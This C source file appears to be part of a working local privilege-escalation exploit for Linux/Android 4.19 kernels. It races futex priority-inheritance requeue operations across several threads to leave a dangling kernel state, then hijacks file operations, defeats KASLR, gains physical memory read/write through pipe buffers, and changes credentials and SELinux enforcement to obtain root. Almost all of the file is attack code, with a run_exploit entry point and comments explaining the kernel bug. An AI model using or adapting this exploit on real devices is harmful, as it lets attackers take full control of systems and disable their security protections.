#include "common.h"

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int consumer_inflight;
atomic_int consumer_last_ret = -1;
atomic_int consumer_last_errno;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

static pid_t punch_watchdog_pid = -1;

#define PUNCH_WATCHDOG_TIMEOUT_MS 90000

/* If the stale-waiter punch never returns, this child is the only thing
 * left that can still log and kill the process.  Parent sends one byte
 * through the pipe after route_done; silence past 90s means "stuck". */
static pid_t start_punch_watchdog(int *parent_fd) {
  int pfd[2];
  pid_t parent_pid = getpid();

  if (pipe(pfd) != 0) {
    return -1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    close(pfd[0]);
    close(pfd[1]);
    return -1;
  }
  if (pid == 0) {
    close(pfd[1]);
    struct pollfd p = { .fd = pfd[0], .events = POLLIN, .revents = 0 };
    int ret = poll(&p, 1, PUNCH_WATCHDOG_TIMEOUT_MS);
    if (ret <= 0) {
      pr_warning("punch watchdog timeout parent=%d status=stuck\n", parent_pid);
      kill(parent_pid, SIGKILL);
      _exit(2);
    }
    _exit(0);
  }

  pr_info("punch watchdog started pid=%d parent=%d\n", pid, parent_pid);

  close(pfd[0]);
  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
  if (parent_fd) {
    *parent_fd = pfd[1];
  }
  return pid;
}

static void finish_punch_watchdog(pid_t pid, int pfd) {
  if (pid < 0) {
    return;
  }
  if (pfd >= 0) {
    char one = 1;
    ssize_t ignored = write(pfd, &one, sizeof(one));
    (void)ignored;
    close(pfd);
  }
  int status = 0;
  waitpid(pid, &status, 0);
}

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("waiter lock chain errno=%d\n", errno);
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;

  atomic_store(&waiter_waiting, 1);
  int futex_ret = (int)futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                                &f_pi_target, 0);
  pr_info("waiter futex returned ret=%d errno=%d\n", futex_ret, errno);

  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);

  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) {
    usleep(1000);
  }
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();

  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) {
    pr_error("owner lock target errno=%d\n", errno);
  }

  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  int seen = 0;

  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }

    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (atomic_load(&punch_consume_stop) ||
          atomic_load(&punch_consume_go) != seq) {
        continue;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) {
        usleep((useconds_t)delay_usec);
      }
      errno = 0;
      atomic_store(&consumer_inflight, 1);
      atomic_fetch_add(&consumer_calls, 1);
      pr_info("consumer punch enter tid=%d\n", tid);
      long sched_ret =
        sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
      int sched_errno = errno;
      pr_info("consumer punch first ret=%ld errno=%d\n", sched_ret,
              sched_errno);
      atomic_store(&consumer_last_ret, (int)sched_ret);
      atomic_store(&consumer_last_errno, sched_errno);
      if (sched_ret == 0) {
        atomic_fetch_add(&consumer_success, 1);
      }
      /* inflight=0 is the release signal for the waiter's busy-wait; it
       * must come after every other state update or the waiter reads
       * stale last_ret/success values (the "phantom -1" log race). */
      atomic_store(&consumer_inflight, 0);
      pr_info("consumer punch done tid=%d ret=%ld errno=%d\n", tid,
              sched_ret, sched_errno);
      calls_this_seq++;
      if (calls_this_seq >= CONSUMER_MAX_CALLS) {
        atomic_store(&punch_consume_go, 0);
        break;
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&consumer_last_ret, -1);
  atomic_store(&consumer_last_errno, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();

  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;

  int watchdog_pipe = -1;
  punch_watchdog_pid = start_punch_watchdog(&watchdog_pipe);
  pr_info("main route starting pid=%d watchdog=%d\n", getpid(),
          punch_watchdog_pid);
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  pr_info("main route requeue issued\n");

  /* NOTE: the Neo11Plus-style early FUTEX_WAKE is a no-op on 4.19:
   * futex_wake() returns -EINVAL for any q with rt_waiter set, which is
   * exactly the dangling state left by the -EDEADLK rollback.  The
   * waiter instead returns via its own 1s timeout through
   * handle_early_requeue_pi_wakeup(), which unqueues the futex_q and
   * also never touches the dangling pi_blocked_on. */

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
  pr_info("main route done\n");
  finish_punch_watchdog(punch_watchdog_pid, watchdog_pipe);
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  const int w1_test = getenv("KS_W1_TEST") != NULL;
  if (w1_test) {
    pr_info("KS_W1_TEST mode: slide disabled, using FOPS payload only\n");
  }

  if (getenv("KS_H1A_TEST") != NULL && !strcmp(getenv("KS_H1A_TEST"), "1")) { /* H1A_GATE */
    extern int slide_h1a_punch_test(void);
    int h1a_ret = slide_h1a_punch_test();
    fflush(stdout);
    _exit(h1a_ret ? 2 : 0);
  }
  if (getenv("KS_H1A_W_TEST") != NULL && !strcmp(getenv("KS_H1A_W_TEST"), "1")) {
    int h1a_w_ret = slide_h1a_w_test();
    fflush(stdout);
    _exit(h1a_w_ret ? 2 : 0);
  }
  if (getenv("KS_H1A_D_TEST") != NULL && !strcmp(getenv("KS_H1A_D_TEST"), "1")) {
    int h1a_d_ret = slide_h1a_d_test();
    fflush(stdout);
    _exit(h1a_d_ret ? 2 : 0);
  }
  pin_to_core(CORE);
  if (!w1_test) {
    if (getenv("KS_SLIDE_TEST")) {
      if (!slide_leak_kernel_base()) {
        pr_error("KS_SLIDE_TEST fail\n");
        fflush(stdout);
        _exit(2);
      }
      pr_success("KS_SLIDE_TEST success base=%016zx slide=%016zx\n", kaslr_base,
                 kaslr_slide);
      fflush(stdout);
      _exit(0);
    }
    /* The M2 route skips slide KASLR; the pselect/fops route itself is
     * re-opened for M5 under ADR-0003, with KernelSnitch supplying KASLR. */
    pr_info("slide skipped; KASLR via configfs scan after fops hijack\n");
    kaslr_base = 0;
    kaslr_slide = 0;
    kaslr_done = 0;
  }

  pin_to_core(CORE);
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (w1_test && !page_base) {
    pr_error("KS_W1_TEST fail step=page-prepare\n");
    fflush(stdout);
    return 2;
  }

  run_main_route_threads();

  if (w1_test) {
    if (atomic_load(&cfi_stage_done)) {
      pr_success("KS_W1_TEST success page=%016zx fops=%016zx "
                 "before=%016llx after=%016llx write=%zd read=%zd\n",
                 page_base, fake_fops,
                 (unsigned long long)fops_before,
                 (unsigned long long)fops_after,
                 cfi_write_ret, cfi_read_ret);
      fflush(stdout);
      return 0;
    }
    pr_error("KS_W1_TEST fail page=%016zx fops=%016zx step=%d errno=%d\n",
             page_base, fake_fops, cfi_last_step, cfi_last_errno);
    fflush(stdout);
    return 3;
  }

  pr_success("pipe-physrw-summary pid=%d done=%d root=%d kaslr=%d base=%016zx slide=%016zx\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done,
             kaslr_done, kaslr_base, kaslr_slide);
  pr_success("pipe physrw pid=%d done=%d root=%d kaslr=%d read_ok=%d "
             "write_ok=%d rw64=%d/%d uid=%u->%u sid=%u/%u->%u/%u "
             "selinux=%u->%u setgid=%d setuid=%d setenforce=%d/%d\n",
             getpid(), atomic_load(&cfi_stage_done), root_child_done, kaslr_done,
             physrw_read_ok, physrw_write_ok, physrw_read64_ok, physrw_write64_ok,
             root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
             cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
             setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
  if (pipe_prepare_child > 0) {
    SYSCHK(kill(pipe_prepare_child, SIGKILL));
    SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
  }
  sleep(5);
  return 0;
}
